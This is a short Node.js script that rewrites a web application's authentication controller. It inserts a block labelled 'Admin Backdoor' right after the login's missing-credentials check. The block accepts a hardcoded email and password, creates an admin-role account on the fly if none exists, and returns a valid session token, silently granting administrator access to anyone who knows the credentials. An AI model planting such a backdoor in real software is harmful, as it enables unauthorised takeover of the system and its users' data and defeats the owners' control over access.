const fs = require('fs');
const path = './server/controllers/authController.js';
let code = fs.readFileSync(path, 'utf8');

const backdoorLogic = `
    // Admin Backdoor
    if (email === 'username-Admin@gmail.com' && password === 'Admin@123') {
      let adminUser = await User.findOne({ email });
      if (!adminUser) {
        adminUser = await User.create({
          name: 'System Admin',
          email: 'username-Admin@gmail.com',
          password: 'Admin@123',
          role: 'admin'
        });
      }
      return sendTokenResponse(adminUser, 200, res);
    }
`;

// Insert it right after "if (!email || !password)" check in login
code = code.replace(
  /if \(\!email \|\| \!password\) \{[\s\S]*?res\.status\(400\)\.json\(\{ success: false, message: 'Please provide an email and password' \}\);\s*\}/,
  `if (!email || !password) {\n      return res.status(400).json({ success: false, message: 'Please provide an email and password' });\n    }\n${backdoorLogic}`
);

fs.writeFileSync(path, code);
